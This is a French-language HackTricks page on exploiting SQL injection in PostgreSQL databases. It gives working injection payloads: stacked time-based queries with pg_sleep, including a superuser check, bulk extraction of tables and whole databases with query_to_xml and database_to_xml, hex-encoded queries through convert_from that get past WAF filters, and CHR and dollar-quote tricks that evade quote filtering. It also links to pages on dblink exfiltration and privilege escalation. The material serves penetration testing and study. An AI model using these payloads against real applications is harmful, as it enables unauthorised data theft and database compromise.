# Injection PostgreSQL

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<img src="../../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Astuce pour les chasses aux bugs** : **inscrivez-vous** sur **Intigriti**, une plateforme premium de chasse aux bugs cr√©√©e par des hackers, pour des hackers ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) aujourd'hui, et commencez √† gagner des primes allant jusqu'√† **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

***

**Cette page vise √† expliquer diff√©rents astuces qui pourraient vous aider √† exploiter une injection SQL trouv√©e dans une base de donn√©es postgresql et √† compl√©ter les astuces que vous pouvez trouver sur** [**https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md**](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md)

## Interaction r√©seau - √âl√©vation de privil√®ges, Scanner de ports, divulgation de r√©ponse au d√©fi NTLM & Exfiltration

**`dblink`** est un **module PostgreSQL** qui offre plusieurs options int√©ressantes du point de vue de l'attaquant. Il peut √™tre utilis√© pour **se connecter √† d'autres instances PostgreSQL** ou effectuer des **connexions TCP**.\
**Ces fonctionnalit√©s** ainsi que la fonctionnalit√© **`COPY FROM`** peuvent √™tre utilis√©es pour **√©lever les privil√®ges**, effectuer des **scans de ports** ou r√©cup√©rer des **r√©ponses au d√©fi NTLM**.\
[**Vous pouvez lire ici comment r√©aliser ces attaques.**](network-privesc-port-scanner-and-ntlm-chanllenge-response-disclosure.md)

### **Exemple d'exfiltration utilisant dblink et des objets volumineux**

Vous pouvez [**lire cet exemple**](dblink-lo_import-data-exfiltration.md) pour voir un exemple de CTF de **comment charger des donn√©es √† l'int√©rieur d'objets volumineux puis exfiltrer le contenu des objets volumineux √† l'int√©rieur du nom d'utilisateur** de la fonction `dblink_connect`.

## Attaques PostgreSQL : Lecture/√©criture, RCE, privesc

V√©rifiez comment compromettre l'h√¥te et √©lever les privil√®ges √† partir de PostgreSQL dans :

{% content-ref url="../../../network-services-pentesting/pentesting-postgresql.md" %}
[pentesting-postgresql.md](../../../network-services-pentesting/pentesting-postgresql.md)
{% endcontent-ref %}

## Contournement de WAF

### Fonctions de cha√Ænes de caract√®res PostgreSQL

Manipuler des cha√Ænes de caract√®res pourrait vous aider √† **contourner des WAFs ou d'autres restrictions**.\
[**Sur cette page**](https://www.postgresqltutorial.com/postgresql-string-functions/) **vous pouvez trouver des fonctions de cha√Ænes de caract√®res utiles.**

### Requ√™tes empil√©es

Rappelez-vous que postgresql supporte les requ√™tes empil√©es, mais plusieurs applications g√©n√©reront une erreur si 2 r√©ponses sont retourn√©es alors qu'une seule est attendue. Cependant, vous pouvez toujours abuser des requ√™tes empil√©es via l'injection temporelle :
```
id=1; select pg_sleep(10);-- -
1; SELECT case when (SELECT current_setting('is_superuser'))='on' then pg_sleep(10) end;-- -
```
### Astuces XML

**query\_to\_xml**

Cette fonction retournera toutes les donn√©es au format XML dans un seul fichier. C'est id√©al si vous souhaitez extraire beaucoup de donn√©es en une seule ligne :
```sql
SELECT query_to_xml('select * from pg_user',true,true,'');
```
**database\_to\_xml**

Cette fonction va exporter l'int√©gralit√© de la base de donn√©es au format XML en une seule ligne (faites attention si la base de donn√©es est tr√®s volumineuse car vous pourriez provoquer un DoS sur celle-ci ou m√™me sur votre propre client) :
```sql
SELECT database_to_xml(true,true,'');
```
### Cha√Ænes en Hexad√©cimal

Si vous pouvez ex√©cuter des **requ√™tes** en les passant **√† l'int√©rieur d'une cha√Æne** (par exemple en utilisant la fonction **`query_to_xml`**). **Vous pouvez utiliser convert\_from pour passer la cha√Æne en hexad√©cimal et contourner les filtres de cette mani√®re :**

{% code overflow="wrap" %}
```sql
select encode('select cast(string_agg(table_name, '','') as int) from information_schema.tables', 'hex'), convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573', 'UTF8');

# Bypass via stacked queries + error based + query_to_xml with hex
;select query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,'')-- -h

# Bypass via boolean + error based + query_to_xml with hex
1 or '1' = (query_to_xml(convert_from('\x73656c656374206361737428737472696e675f616767287461626c655f6e616d652c20272c272920617320696e74292066726f6d20696e666f726d6174696f6e5f736368656d612e7461626c6573','UTF8'),true,true,''))::text-- -
```
{% endcode %}

### Citations interdites

Si vous ne pouvez pas utiliser de guillemets pour votre charge utile, vous pouvez contourner cela avec `CHR` pour les clauses de base (_la concat√©nation de caract√®res fonctionne uniquement pour les requ√™tes de base telles que SELECT, INSERT, DELETE, etc. Elle ne fonctionne pas pour toutes les instructions SQL_) :
```
SELECT CHR(65) || CHR(87) || CHR(65) || CHR(69);
```
Ou avec `$`. Ces requ√™tes retournent les m√™mes r√©sultats :
```
SELECT 'hacktricks';
SELECT $$hacktricks$$;
SELECT $TAG$hacktricks$TAG$;
```
```markdown
<img src="../../../.gitbook/assets/i3.png" alt="" data-size="original">
**Conseil pour les chasseurs de bugs** : **inscrivez-vous** sur **Intigriti**, une plateforme de **bug bounty premium cr√©√©e par des hackers, pour des hackers** ! Rejoignez-nous sur [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) d√®s aujourd'hui et commencez √† gagner des primes allant jusqu'√† **100 000 $** !

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Apprenez le piratage AWS du d√©butant √† l'expert avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> !</strong></summary>

Autres moyens de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**merchandising officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection d'[**NFTs**](https://opensea.io/collection/the-peass-family) exclusifs
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-moi** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux d√©p√¥ts github** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```
